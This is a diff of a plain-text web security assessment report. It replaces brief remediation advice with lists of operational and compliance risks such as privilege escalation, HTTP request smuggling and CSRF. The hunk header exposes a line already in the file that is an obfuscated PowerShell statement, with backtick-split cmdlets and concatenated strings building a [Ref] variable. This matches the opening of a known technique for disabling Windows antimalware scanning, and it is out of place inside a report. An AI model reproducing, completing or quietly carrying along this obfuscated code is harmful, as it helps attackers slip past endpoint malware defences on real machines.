@@ -36,8 +36,19 @@ S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
 
 =============================================================
 
-Vulnerable and Outdated Components: It is recommended to regularly update and patch all software components to their latest secure versions.
+Operational Risk:
 
-Application Version Disclosure: It is recommended to obscure or remove application version information from responses to prevent attackers from exploiting known vulnerabilities.
+Privilege Escalation: Leads to unauthorized access and misuse of system resources, disrupting operational integrity.
+Malicious File Upload Vulnerability: Compromises server resources and data integrity, impacting operational availability.
+Host Header Injection: Allows request manipulation and unauthorized access, disrupting application functionality and availability.
+HTTP Request Smuggling: Manipulates request handling, leading to potential data corruption or unauthorized access.
+Improper Session Management: Results in unauthorized access and session hijacking, disrupting user activities and application functionality.
+Content Spoofing: Deceives users with misleading content, potentially damaging user trust and application reputation.
+Improper Input Validation: Allows various attacks (e.g., SQL injection, XSS), compromising data integrity and availability.
+Application Version Disclosure: Exposes known vulnerabilities, potentially leading to targeted attacks and operational disruptions.
+Insecure Methods Allowed: Enables unauthorized actions, compromising data integrity and availability, and potentially leading to application downtime.
+Regulatory/Compliance Risk:
 
-Insecure Methods Allowed: It is recommended to disable insecure HTTP methods and only allow necessary and secure methods like GET and POST.
+CSRF (Cross-Site Request Forgery): Non-compliance with standards mandating protection against unauthorized actions performed on behalf of users.
+Misconfigured CSP (Content Security Policy): Non-compliance with security standards requiring secure configurations to protect user data and prevent security breaches.
+Vulnerable and Outdated Components: Non-compliance with regulatory requirements mandating the use of supported and secure software versions.
